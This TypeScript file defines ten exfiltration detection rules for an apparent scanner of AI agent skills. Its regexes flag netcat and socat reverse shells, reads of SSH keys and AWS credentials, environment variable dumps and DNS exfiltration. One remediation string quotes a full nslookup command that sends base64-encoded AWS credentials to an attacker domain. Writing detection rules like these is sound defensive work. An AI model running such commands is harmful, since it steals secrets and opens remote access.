import type { Rule } from "../types.js";

export const EXFILTRATION_RULES: readonly Rule[] = [
  {
    id: "EX-001",
    category: "exfiltration",
    severity: "CRITICAL",
    pattern: /\b(curl|wget|fetch|axios|got|http\.get|https\.get)\b[^#\n]*\b(env|secret|token|key|password|credential|api[-_]?key)\b/i,
    message: "Exfiltration: network request combined with secrets/env access",
    remediation: "Never include API keys, tokens, or secrets in network requests from a skill. Credentials should stay local. If telemetry is needed, use only non-sensitive metadata and route through an authenticated internal endpoint.",
    skipCommentLines: true,
    skipPlaceholderLines: true,
  },
  {
    id: "EX-002",
    category: "exfiltration",
    severity: "CRITICAL",
    pattern: /\$\{?\s*(HOME|USER|PATH|API_KEY|SECRET|TOKEN|PASSWORD|ANTHROPIC|OPENAI)[^}]*\}?[^#\n]*(curl|wget|fetch|http)/i,
    message: "Exfiltration: env variable interpolated into a network call",
    skipCommentLines: true,
    skipPlaceholderLines: true,
  },
  {
    id: "EX-003",
    category: "exfiltration",
    severity: "HIGH",
    pattern: /\b(curl|wget)\b[^#\n]*(-d|--data|--data-raw|--data-binary|--data-urlencode)\b[^#\n]*(cat\s+\/|<\s*\/|\$\()/i,
    message: "Exfiltration: curl/wget POSTing file content to a remote server",
    skipCommentLines: true,
    skipPlaceholderLines: true,
  },
  {
    id: "EX-004",
    category: "exfiltration",
    severity: "HIGH",
    pattern: /\b(nc|netcat|ncat)\b[^#\n]*(-e|--exec|-c|--sh-exec)/i,
    message: "Exfiltration/RCE: netcat with exec flag — reverse shell or data pipe",
  },
  {
    id: "EX-005",
    category: "exfiltration",
    severity: "HIGH",
    pattern: /\b(socat|openssl\s+s_client)\b[^#\n]*(exec:|system:|EXEC:|SYSTEM:)/i,
    message: "Exfiltration/RCE: socat or openssl used for reverse shell",
  },
  {
    id: "EX-006",
    category: "exfiltration",
    severity: "HIGH",
    pattern: /cat\s+(~\/\.ssh\/|\/etc\/passwd|\/etc\/shadow|~\/\.aws\/credentials|~\/\.config\/)/i,
    message: "Exfiltration: reading sensitive system files (SSH keys, credentials, shadow)",
  },
  {
    id: "EX-007",
    category: "exfiltration",
    severity: "HIGH",
    pattern: /JSON\.stringify\(\s*(process\.)?env\b|Object\.(entries|keys|values)\(\s*(process\.)?env\b|os\.environ\.items|dict\(\s*os\.environ/i,
    message: "Exfiltration: serializing environment variables or secrets store for exfiltration",
  },
  {
    id: "EX-008",
    category: "exfiltration",
    severity: "INFO",
    pattern: /\b(http|https)\.request\s*\(|\bnet\.(createConnection|connect)\s*\(|\btls\.connect\s*\(/i,
    message: "Exfiltration: low-level Node.js network/socket call — review for legitimacy; use skillsguard-ignore: EX-008 to suppress known-good calls",
  },
  {
    id: "EX-009",
    category: "exfiltration",
    severity: "CRITICAL",
    pattern: /\b(nslookup|dig|host|drill)\b[^#\n]*\$\(/i,
    message: "DNS exfiltration: DNS lookup with command substitution — encodes data in subdomain",
    remediation: "Attackers encode secrets in DNS queries (e.g., nslookup $(cat .aws/credentials | base64).attacker.com) to exfiltrate without HTTP. Block or audit.",
  },
  {
    id: "EX-010",
    category: "exfiltration",
    severity: "CRITICAL",
    // ponytail: variable-indirection bypass for EX-001. Catches `KEY=$SECRET ... curl $KEY`
    // where the secret never appears literally next to the network call. Requires the
    // *value* assigned to look sensitive (KEY/SECRET/TOKEN/...), not just the var name,
    // to avoid flagging `URL=https://example.com; curl $URL`. Relies on the sliding
    // window (scanner.ts) to bridge assignment and use across separate lines.
    pattern:
      /\b([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(?:\$\{?(?:process\.env\.)?[A-Z_]*(?:KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL|ANTHROPIC|OPENAI)[A-Z_]*\}?|process\.env\.[A-Z_]*(?:KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL)[A-Z_]*)[\s\S]{0,300}\b(curl|wget|fetch|axios|http\.get|https\.get)\b[^#\n]*\$?\{?\1\}?\b/i,
    message: "Exfiltration: secret assigned to a variable, then used in a network call — variable indirection bypasses EX-001",
    remediation: "Assigning a secret to an intermediate variable before using it in a network request doesn't make it safer — it's still being sent off-device. Review whether this request needs to carry credential material at all.",
    skipCommentLines: true,
    skipPlaceholderLines: true,
  },
];
